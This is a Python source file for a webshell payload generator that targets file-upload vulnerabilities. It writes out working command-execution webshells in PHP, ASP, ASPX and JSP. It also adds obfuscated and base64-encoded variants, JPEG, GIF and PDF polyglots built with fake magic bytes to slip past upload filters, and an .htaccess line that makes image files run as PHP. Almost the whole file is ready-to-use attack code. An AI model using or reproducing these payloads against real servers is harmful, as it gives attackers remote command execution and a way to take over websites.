"""
payload_generator.py — Multi-language & Polymorphic Payload Generator
Supports PHP, ASP, ASPX, JSP webshells + obfuscated/polyglot variants.
"""

import base64
import random
import string
from typing import Dict, Optional


class PayloadGenerator:
    """Generate webshell payloads for various server-side languages."""

    # ------------------------------------------------------------------ #
    #  Raw payload templates                                               #
    # ------------------------------------------------------------------ #

    _PHP_SIMPLE = b"<?php system($_GET['cmd']); ?>"

    _PHP_ADVANCED = b"""<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    $output = shell_exec($cmd . ' 2>&1');
    echo "<pre>$output</pre>";
}
?>"""

    _PHP_OBFUSCATED_TEMPLATE = (
        '<?php '
        '$f="{func}";'
        '$f($_GET["{param}"]);'
        '?>'
    )

    _PHP_BASE64 = (
        b"<?php eval(base64_decode('"
        + base64.b64encode(b"system($_GET['cmd']);")
        + b"')); ?>"
    )

    _PHP_POLYGLOT_JPEG = (
        b"\xff\xd8\xff\xe0"          # JPEG SOI + APP0 marker
        b"\x00\x10JFIF\x00\x01\x01"  # JFIF header stub
        b"\x00\x00\x01\x00\x01\x00\x00"
        b"<?php system($_GET['cmd']); ?>"
    )

    _PHP_POLYGLOT_GIF = b"GIF89a<?php system($_GET['cmd']); ?>"
    _PHP_POLYGLOT_PDF = b"%PDF-1.4\n<?php system($_GET['cmd']); ?>"

    _ASP_SIMPLE = b'<%eval request("cmd")%>'

    _ASPX_SIMPLE = b"""<%@ Page Language="C#" %>
<%
    string cmd = Request.QueryString["cmd"];
    if (!string.IsNullOrEmpty(cmd))
    {
        var proc = System.Diagnostics.Process.Start(
            new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd)
            { RedirectStandardOutput = true, UseShellExecute = false });
        Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
    }
%>"""

    _JSP_SIMPLE = b"""<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process proc = Runtime.getRuntime().exec(cmd);
        InputStream is = proc.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
        String line;
        out.println("<pre>");
        while ((line = reader.readLine()) != null) out.println(line);
        out.println("</pre>");
    }
%>"""

    _HTACCESS_PAYLOAD = b"AddType application/x-httpd-php .jpg .png .gif .txt\n"

    # Magic byte signatures
    _MAGIC_BYTES = {
        "jpg":  b"\xff\xd8\xff\xe0\x00\x10JFIF\x00",
        "png":  b"\x89PNG\r\n\x1a\n",
        "gif":  b"GIF89a",
        "pdf":  b"%PDF-1.4\n",
        "bmp":  b"BM",
        "zip":  b"PK\x03\x04",
    }

    # ------------------------------------------------------------------ #
    #  Public API                                                          #
    # ------------------------------------------------------------------ #

    def get(
        self,
        lang: str = "php",
        variant: str = "simple",
        magic_prefix: Optional[str] = None,
    ) -> bytes:
        """
        Return payload bytes.

        Args:
            lang:         php | asp | aspx | jsp | htaccess
            variant:      simple | advanced | obfuscated | base64 |
                          polyglot_jpeg | polyglot_gif | polyglot_pdf
            magic_prefix: Optional image type to prepend magic bytes (jpg/png/gif/pdf)
        """
        lang = lang.lower()
        variant = variant.lower()

        payload = self._build(lang, variant)

        if magic_prefix and magic_prefix in self._MAGIC_BYTES:
            payload = self._MAGIC_BYTES[magic_prefix] + payload

        return payload

    def all_variants(self, lang: str = "php") -> Dict[str, bytes]:
        """Return all variants for a language as {name: bytes}."""
        variants = ["simple", "advanced", "obfuscated", "base64",
                    "polyglot_jpeg", "polyglot_gif", "polyglot_pdf"]
        return {v: self._build(lang, v) for v in variants}

    def command_param(self, lang: str = "php", variant: str = "simple") -> str:
        """Return the GET/POST parameter name used by this payload."""
        if lang == "asp":
            return "cmd"
        if lang == "aspx":
            return "cmd"
        if lang == "jsp":
            return "cmd"
        if variant == "obfuscated":
            return self._obfuscated_param()  # fixed seed so it's deterministic per run
        return "cmd"

    # ------------------------------------------------------------------ #
    #  Internal builders                                                   #
    # ------------------------------------------------------------------ #

    def _build(self, lang: str, variant: str) -> bytes:
        if lang == "asp":
            return self._ASP_SIMPLE
        if lang == "aspx":
            return self._ASPX_SIMPLE
        if lang == "jsp":
            return self._JSP_SIMPLE
        if lang == "htaccess":
            return self._HTACCESS_PAYLOAD

        # Default: PHP
        if variant == "advanced":
            return self._PHP_ADVANCED
        if variant == "base64":
            return self._PHP_BASE64
        if variant == "obfuscated":
            return self._obfuscated_php().encode()
        if variant == "polyglot_jpeg":
            return self._PHP_POLYGLOT_JPEG
        if variant == "polyglot_gif":
            return self._PHP_POLYGLOT_GIF
        if variant == "polyglot_pdf":
            return self._PHP_POLYGLOT_PDF

        return self._PHP_SIMPLE  # simple (default)

    def _obfuscated_php(self) -> str:
        """Generate a simple variable-function obfuscation."""
        funcs = ["system", "shell_exec", "passthru", "exec", "popen"]
        func = random.choice(funcs)
        param = self._obfuscated_param()
        return self._PHP_OBFUSCATED_TEMPLATE.format(func=func, param=param)

    @staticmethod
    def _obfuscated_param() -> str:
        random.seed(42)  # deterministic so command_param() matches
        return "".join(random.choices(string.ascii_lowercase, k=6))
